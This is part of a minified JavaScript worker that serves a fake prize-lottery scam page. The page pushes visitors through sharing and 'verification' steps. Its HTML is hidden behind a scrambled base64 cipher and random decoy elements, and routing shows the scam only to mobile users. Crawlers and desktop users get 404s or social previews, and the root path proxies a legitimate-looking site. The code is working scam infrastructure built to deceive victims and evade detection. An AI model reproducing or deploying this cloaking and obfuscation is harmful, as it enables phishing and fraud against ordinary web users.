max="100"'},{tag:"input",content:"",style:"display:none!important;visibility:hidden!important;opacity:0!important;position:absolute!important;left:-9999px!important;top:-9999px!important;width:0!important;height:0!important;",attrs:'type="range" min="0" max="100" value="0"'},{tag:"input",content:"",style:"display:none!important;visibility:hidden!important;opacity:0!important;position:absolute!important;left:-9999px!important;top:-9999px!important;width:0!important;height:0!important;",attrs:'type="checkbox"'},{tag:"span",content:"",style:"display:none!important;visibility:hidden!important;opacity:0!important;position:absolute!important;left:-9999px!important;top:-9999px!important;width:0!important;height:0!important;overflow:hidden!important;"},{tag:"section",content:"",style:"display:none!important;visibility:hidden!important;opacity:0!important;position:absolute!important;left:-9999px!important;top:-9999px!important;width:0!important;height:0!important;overflow:hidden!important;"}].map((t,n)=>{let a=this.randomNames[`cssClass${n+1}`],i=t.attrs?` ${t.attrs}`:"";return`<${t.tag} class="${a}"${i}>${t.content}</${t.tag}><style>.${a}{${t.style}}</style>`})}getRandomObfuscationFragment(){let e=this.generateObfuscationFragments();return e[Math.floor(Math.random()*e.length)]}processFragments(e){let t={};for(let[n,a]of Object.entries(e))if(n!=="obfuscation"){let i=this.getRandomObfuscationFragment(),r=a+i;t[n]=this.encryptFragment(r)}return t}generateDecryptFunction(){return`
function ${this.randomNames.decryptFunc}(encryptedContent) {
    try {
        const base64CharMap = ${JSON.stringify({Q:"A",W:"B",E:"C",R:"D",T:"E",Y:"F",U:"G",I:"H",O:"I",P:"J",A:"K",S:"L",D:"M",F:"N",G:"O",H:"P",J:"Q",K:"R",L:"S",Z:"T",X:"U",C:"V",V:"W",B:"X",N:"Y",M:"Z",q:"a",w:"b",e:"c",r:"d",t:"e",y:"f",u:"g",i:"h",o:"i",p:"j",a:"k",s:"l",d:"m",f:"n",g:"o",h:"p",j:"q",k:"r",l:"s",z:"t",x:"u",c:"v",v:"w",b:"x",n:"y",m:"z",9:"0",8:"1",7:"2",6:"3",5:"4",4:"5",3:"6",2:"7",1:"8",0:"9","/":"+","+":"/","=":"="})};
        
        const deobfuscated = encryptedContent.split('|')[0];
        
        const charRestored = deobfuscated.split('').map(char => base64CharMap[char] || char).join('');
        try {
            const decoded = atob(charRestored);
            return decoded;
        } catch (e) {
            const binaryString = atob(charRestored);
            const bytes = new Uint8Array(binaryString.length);
            for (let i = 0; i < binaryString.length; i++) {
                bytes[i] = binaryString.charCodeAt(i);
            }
            return new TextDecoder().decode(bytes);
        }
        
    } catch (error) {
        return '';
    }
}`}};function st(){return{fragment1:`<!DOCTYPE html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title data-text="t"></title>
    <link rel="icon" href="data:,">
    <link rel="stylesheet" href="\${CONFIG.resourceDomain}/styles.css">
    <script>
        window.I18N_CONFIG = {
            currentCountry: '\${CONFIG.currentCountry}',
            currentLanguage: '\${CONFIG.currentLanguage}',
            Hash:'\${CONFIG.Hash}',
            prize: {
                name: '\${CONFIG.prizeName}',
                image: '\${CONFIG.prizeImage}'
            }
        };
    </script>
    <style>
        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #fff;
          display: flex;
            flex-direction: column;
          align-items: center;
            justify-content: center;
            z-index: 9999;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }
        .loading-spinner {
            width: 40px;
            height: 40px;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #3498db;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .loading-text {
          color: #666;
            font-size: 16px;
            text-align: center;
        }
        .loading-overlay.hidden {
            display: none;
        }
    </style>
    
    <style>
        .lazy {
            opacity: 0;
            transition: opacity 0.3s;
        }
        .lazy.loaded {
            opacity: 1;
        }
        .placeholder {
            background: #f0f0f0;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #999;
            font-size: 14px;
        }
      </style>
    </head>
    <body>
    <div id="loadingOverlay" class="loading-overlay">
        <div class="loading-spinner"></div>
        <div class="loading-text">Loading...</div>
    </div>

    <div class="container">
        <div class="header">
            <div class="header-content">
                <img data-src="" data-resource="img.logo" class="logo lazy">
            </div>
        </div>

        <div class="banner">
            <div class="banner-l">
                <span class="crown"></span>
                <span data-text="t"></span>
                <span class="gift-icon"></span>
            </div>
            <div class="banner-r"></div>
        </div>`,fragment2:`        <div class="main-content">
            <h1 class="congratulations" data-text="cong"></h1>
            <p class="subtitle" data-text="t"></p>
            <p class="subtitle" data-text="sub"></p>
            
            <div class="building-image">
                <img data-src="" data-resource="img.index" class="lazy">
            </div>

            <div id="q" class="q">
            </div>
        </div>

        <div id="verify" class="verify" style="display: none;">
            <h2 data-text="v.t"></h2>
            <div class="loading-spinner"></div>
            <div id="msg"></div>
        </div>

        <div id="lottery" class="lottery" style="display: none;">
            <h2 data-text="l.t"></h2>
            <div id="grid" class="grid">
            </div>
            <div id="fire" class="fire"></div>
        </div>

        <div id="prize" class="prize" style="display: none;">
            <h2 id="pt" class="pt" data-text="p.t"></h2>
            
            <div class="prize-display">
                <img id="pi" data-src="" class="pi lazy">
                <p class="prize-text" data-text="p.txt"></p>
            </div>

            <div id="share" class="share" style="display: none;">
                <div class="instruction-text">
                    <p data-text="s.i0"></p>
                    <p data-text="s.i1"></p>
                </div>

                <div class="share-buttons">
                </div>

                <div class="share-progress">
                    <p class="progress-text" data-text="s.prog"></p>
                    <div class="progress-bar">
                        <div class="fill" id="fill"></div>
                        <span class="num" id="num">0</span>
                    </div>
                </div>

                <button class="cont" onclick="continueToClaim()" data-text="s.cont"></button>
            </div>

            <div id="done" class="done" style="display: none;">
                <div class="verification-content">
                    <div class="verification-title" data-text="vc.t"></div>
                    
                    <div class="verification-section">
                        <div class="verification-methods-title" data-text="vc.mt"></div>
                        <div class="verification-methods-text" data-text="vc.mtxt"></div>
                        
                        <div class="importance-notice" data-text="vc.imp"></div>
                        
                        <div class="verify-instruction" data-text="vc.inst"></div>
                    </div>
                    
                    <div class="verification-buttons">
                        <button class="vbtn primary" onclick="handleVerifyNow()" data-text="vc.vnow"></button>
                        <button class="vbtn secondary" onclick="handleClickHere()" data-text="vc.click"></button>
                    </div>
                    
                    <button class="vbtn full" onclick="handlePhoneVerification()" data-text="vc.phone"></button>
                </div>
            </div>
        </div>

        <div class="comments-section">
            <div class="comments-header">
                <h3 class="ct" data-text="c.t"></h3>
                <span class="cc" data-text="c.cnt"></span>
            </div>
            <div id="cmt">
            </div>
          </div>

        <div class="footer" data-text="foot"></div>
    </div>`,fragment3:`    <div id="modal" class="modal" style="display: none;">
        <div class="modal-content">
            <div class="modal-title" data-text="m.cong"></div>
            <div class="modal-body">
                <div class="modal-image">
                    <img data-src="" data-resource="img.popup" class="modal-img lazy">
                </div>
                <div class="modal-message-bold" data-text="m.saved"></div>
                <div class="modal-message" data-text="m.chance"></div>
                <div class="modal-message" data-text="m.select"></div>
                <div class="modal-message" data-text="m.attempts"></div>
            </div>
            <button class="btn" onclick="closeModal()" data-text="m.ok"></button>
        </div>
    </div>

    <div id="gmodal" class="modal" style="display: none;">
        <div class="modal-content">
            <div id="icon"></div>
            <div id="img"></div>
            <div id="title"></div>
            <div id="msg"></div>
            <div id="rules"></div>
            <button id="btn" class="btn" onclick="closeGenericModal()" data-text="m.ok"></button>
        </div>
      </div>

    
</body>
</html>`}}function rt(o,e,t,n){return`<!DOCTYPE html>
<html lang='${n.currentLanguage}'>
<head>
    <link rel="icon" href="data:,">
</head>
<body>

<script>
const ${t.configVar} = {
    currentCountry: '${n.currentCountry}',
    currentLanguage: '${n.currentLanguage}',
    Hash:'${n.Hash}',
    resourceDomain: '${n.resourceDomain}',
    prizeName: '${n.prizeName}',
    prizeImage: '${n.prizeImage}'
};

const ${t.fragmentsVar} = {
    fragment1: "${o.fragment1}",
    fragment2: "${o.fragment2}",
    fragment3: "${o.fragment3}"
};

${e}

function ${t.assembleFunc}() {
    try {
        var validateConfig = function() {
            var issues = [];
            if (!${t.configVar}.Hash) issues.push('ERROR: Hash is required');
            if (${t.configVar}.Hash === 'undefined') issues.push('ERROR: Hash is undefined');
            if (String(${t.configVar}.Hash).includes('$')) issues.push('ERROR: Hash contains template characters');
            if (${t.configVar}.Hash.length < 10) issues.push('ERROR: Hash length is too short');
            return issues;
        };
        
        var issues = validateConfig();
        if (issues.length > 0) {
            if (!sessionStorage.getItem('_reload_attempted')) {
                sessionStorage.setItem('_reload_attempted', '1');
                setTimeout(function() { location.reload(); }, 500);
            }
            return;
        }
        
        const ${t.fragment1Var} = ${t.decryptFunc}(${t.fragmentsVar}.fragment1);
        const ${t.fragment2Var} = ${t.decryptFunc}(${t.fragmentsVar}.fragment2);
        const ${t.fragment3Var} = ${t.decryptFunc}(${t.fragmentsVar}.fragment3);
        
        let ${t.fullHTMLVar} = ${t.fragment1Var} + ${t.fragment2Var} + ${t.fragment3Var};
        ${t.fullHTMLVar} = ${t.fullHTMLVar}.replace(/\\\${CONFIG.currentCountry}/g, ${t.configVar}.currentCountry);
        ${t.fullHTMLVar} = ${t.fullHTMLVar}.replace(/\\\${CONFIG.currentLanguage}/g, ${t.configVar}.currentLanguage);
        ${t.fullHTMLVar} = ${t.fullHTMLVar}.replace(/\\\${CONFIG.Hash}/g, ${t.configVar}.Hash);
        ${t.fullHTMLVar} = ${t.fullHTMLVar}.replace(/\\\${CONFIG.resourceDomain}/g, ${t.configVar}.resourceDomain);
        ${t.fullHTMLVar} = ${t.fullHTMLVar}.replace(/\\\${CONFIG.prizeName}/g, ${t.configVar}.prizeName);
        ${t.fullHTMLVar} = ${t.fullHTMLVar}.replace(/\\\${CONFIG.prizeImage}/g, ${t.configVar}.prizeImage);
        
        document.open();
        document.write(${t.fullHTMLVar});
        document.close();
        
    setTimeout(() => {
    let i18nReadyHandled = false;
    window.addEventListener('i18nReady', function() {
        if (!i18nReadyHandled) {
            i18nReadyHandled = true;
            hideLoadingOverlay();
        }
    }, { once: true });
    
    const i18nScript = document.createElement('script');
    i18nScript.src = ${t.configVar}.resourceDomain + '/i18n.js';
    

    i18nScript.onload = function() {
        const mainScript = document.createElement('script');
        mainScript.src = ${t.configVar}.resourceDomain + '/script.js';    
        mainScript.onload = function() {

            setTimeout(() => {
                if (!i18nReadyHandled && document.querySelector('.loading-overlay')) {
                    i18nReadyHandled = true;
                    hideLoadingOverlay();
                }
            }, 10000); 
        };
        
        mainScript.onerror = function() {
            console.error('Failed to load script.js');
            if (!i18nReadyHandled) {
                i18nReadyHandled = true;
                hideLoadingOverlay();
            }
        };
        
        document.head.appendChild(mainScript);
    };
    

    i18nScript.onerror = function() {
        console.error('Failed to load i18n.js, cannot initialize properly');
        if (!i18nReadyHandled) {
            i18nReadyHandled = true;
            hideLoadingOverlay();
        }
    };
    
    document.head.appendChild(i18nScript);
    }, 200);
        
        function hideLoadingOverlay() {
            const overlay = document.getElementById('loadingOverlay');
            if (overlay) {
                overlay.classList.add('hidden');
                setTimeout(() => overlay.remove(), 300);
            }
        }
        
        setTimeout(hideLoadingOverlay, 10000);
        
    } catch (error) {
        if (!sessionStorage.getItem('_reload_attempted')) {
            sessionStorage.setItem('_reload_attempted', '1');
            setTimeout(function() { location.reload(); }, 500);
        } else {
            document.write('<html><body><h1>ERROR</h1></body></html>');
        }
    }
}


${t.assembleFunc}();
</script>

    </body>
</html>`}async function U(o,e){let{projectId:t,encryptedProjectId:n,userCountry:a,language:i,currentCountry:r=a,currentLanguage:s=i,resourceDomain:p=e.RESOURCE_DOMAIN}=o;if(!e.ENCRYPTION_KEY||e.ENCRYPTION_KEY.length<16)return new Response("\u914D\u7F6E\u9519\u8BEF",{status:500,headers:{"Content-Type":"text/plain"}});try{let l=S(r),A=await R(t,s,r,e.ENCRYPTION_KEY);if(!A||A==="undefined"||A.length===0)throw new Error("Hash generation failed");let u=st(),m=new I,M=m.processFragments(u),D=m.generateDecryptFunction(),P={currentCountry:r,currentLanguage:s,Hash:A,encryptedProjectId:n,resourceDomain:p,prizeName:l.amount,prizeImage:l.image},z=rt(M,D,m.randomNames,P);return new Response(z,{headers:{"Content-Type":"text/html; charset=utf-8","Cache-Control":"public, max-age=3600","X-Content-Type-Options":"nosniff","X-Frame-Options":"DENY","X-XSS-Protection":"1; mode=block"}})}catch{return new Response("\u9875\u9762\u751F\u6210\u5931\u8D25",{status:500,headers:{"Content-Type":"text/plain"}})}}async function j(o,e){try{let t=new URL(o.url),n=t.pathname,a=At(o),i=d(o);if(ut(n))return new Response(null,{status:204});if(n==="/"||n==="")return console.log("  \u2192 \u6839\u8DEF\u5F84\u8BBF\u95EE\uFF0C\u53CD\u4EE3\u7406\u5230SnapTik"),await mt(o,e);console.log("\u{1F50D} \u8DEF\u7531\u5224\u65AD\u8C03\u8BD5\u4FE1\u606F:"),console.log("  \u57DF\u540D:",a),console.log("  \u8DEF\u5F84:",n),console.log("  \u67E5\u8BE2\u53C2\u6570:",t.search);let r=await pt(n,t.searchParams,e);switch(console.log("  \u8DEF\u5F84\u7C7B\u578B:",r),r){case"jump":return console.log("  \u2192 \u8C03\u7528\u8DF3\u677F\u8DEF\u5F84\u5904\u7406\u51FD\u6570"),await ct(o,e);case"landing":return console.log("  \u2192 \u8C03\u7528\u843D\u5730\u8DEF\u5F84\u5904\u7406\u51FD\u6570"),await lt(o,e);default:return console.log("  \u2192 \u672A\u77E5\u8DEF\u5F84\u7C7B\u578B\uFF0C\u8FD4\u56DE404"),c({language:i})}}catch(t){return console.error("\u8DEF\u5F84\u8DEF\u7531\u9519\u8BEF:",t),g(500)}}async function pt(o,e,t){console.log("\u{1F50D} \u8DEF\u5F84\u7C7B\u578B\u5224\u65AD:"),console.log("  \u8DEF\u5F84:",o);let n=o.substring(1);if(!n)return console.log("  \u274C \u8DEF\u5F84\u4E3A\u7A7A\uFF0C\u5224\u65AD\u4E3A\u672A\u77E5\u8DEF\u5F84"),"unknown";try{let i=n.split("/")[0];if(!i)return console.log("  \u274C \u7B2C\u4E00\u4E2A\u8DEF\u5F84\u6BB5\u4E3A\u7A7A\uFF0C\u5224\u65AD\u4E3A\u672A\u77E5\u8DEF\u5F84"),"unknown";switch(console.log("  \u{1F50D} \u89E3\u5BC6\u7B2C\u4E00\u4E2A\u8DEF\u5F84\u6BB5:",i),(await b(i,t.ENCRYPTION_KEY)).type){case"landing":return console.log("  \u2705 \u57FA\u4E8E\u7B2C\u4E00\u4E2A\u8DEF\u5F84\u6BB5\u89E3\u5BC6\u5224\u65AD\u4E3A\u843D\u5730\u8DEF\u5F84"),"landing";case"jump":return console.log("  \u2705 \u57FA\u4E8E\u7B2C\u4E00\u4E2A\u8DEF\u5F84\u6BB5\u89E3\u5BC6\u5224\u65AD\u4E3A\u8DF3\u677F\u8DEF\u5F84"),"jump";case"invalid":default:return console.log("  \u274C \u7B2C\u4E00\u4E2A\u8DEF\u5F84\u6BB5\u89E3\u5BC6\u5931\u8D25\uFF0C\u5224\u65AD\u4E3A\u672A\u77E5\u8DEF\u5F84"),"unknown"}}catch{return console.log("  \u274C \u89E3\u5BC6\u5F02\u5E38\uFF0C\u5224\u65AD\u4E3A\u672A\u77E5\u8DEF\u5F84"),"unknown"}}function At(o){return new URL(o.url).hostname}async function ct(o,e){try{let n=new URL(o.url).pathname,a=n.substring(1),i=d(o),s=a.split("/")[0];if(!s)return c({language:i});let p=await b(s,e.ENCRYPTION_KEY);if(p.type!=="jump")return c({language:i});let l=p.data.projectId;if(!x(l,e).valid)return c({language:i});let u=Q(o);return await gt(u,{projectId:l,valid:!0},n,e,i)}catch(t){return console.error("\u8DF3\u677F\u57DF\u540D\u5904\u7406\u9519\u8BEF:",t),g(500)}}async function lt(o,e){try{let n=new URL(o.url).pathname,a=n.substring(1);console.log("\u{1F50D} \u843D\u5730\u8DEF\u5F84\u5904\u7406\u8C03\u8BD5\u4FE1\u606F:"),console.log("  \u8DEF\u5F84:",n);let i=d(o),r=G(o),p=a.split("/")[0];if(!p)return c({language:i});let l=await b(p,e.ENCRYPTION_KEY);if(l.type!=="landing")return c({language:i});let A=l.data;if(!E(A.timestamp,A.validity))return c({language:i});if(!x(A.projectId,e).valid)return c({language:i});let m=await K(A.projectId,e.ENCRYPTION_KEY);return await U({projectId:A.projectId,encryptedProjectId:m,userCountry:r,language:i},e)}catch(t){return console.error("\u843D\u5730\u8DEF\u5F84\u5904\u7406\u9519\u8BEF:",t),g(500)}}async function gt(o,e,t,n,a){switch(o.type){case"social_crawler":return L({language:a,projectId:e.projectId,path:t},n);case"mobile_user":let i={projectId:e.projectId,timestamp:T(),validity:parseInt(n.VALIDITY_SECONDS)||86400},r=await k(i,n.ENCRYPTION_KEY),p=t.replace(/^\//,"").split("/")[0]||"";return H({encryptedData:r,projectId:p,language:a},n);case"crawler":case"desktop_user":default:return c({language:a})}}async function mt(o,e){try{let t=e.ROOT_PROXY_URL;console.log("\u{1F504} \u53CD\u4EE3\u7406\u5230SnapTik:",t);let n=new Request(t,{method:o.method,headers:o.headers,body:o.body}),a=await fetch(n),i=new Response(a.body,{status:a.status,statusText:a.statusText,headers:a.headers});return console.log("\u2705 \u53CD\u4EE3\u7406\u6210\u529F\uFF0C\u72B6\u6001\u7801:",a.status),i}catch(t){return console.error("\u274C \u53CD\u4EE3\u7406\u5931\u8D25:",t),g(502,{language:"en"})}}function ut(o){return["/.well-known/appspecific/com.chrome.devtools.json","/.well-known/appspecific/","/.well-known/"].some(t=>t.endsWith("/")?o.startsWith(t):o===t)}var _t={async fetch(o,e,t){let a=new URL(o.url).pathname,i={"Access-Control-Allow-Origin":"*","Access-Control-Allow-Methods":"GET, POST, PUT, DELETE, OPTIONS","Access-Control-Allow-Headers":"Content-Type, Authorization"};if(o.method==="OPTIONS")return new Response(null,{status:200,headers:i});try{return await j(o,e)}catch(r){return console.error("Worker\u9519\u8BEF:",r),g(500)}}};export{_t as default};
//# sourceMappingURL=index.js.map
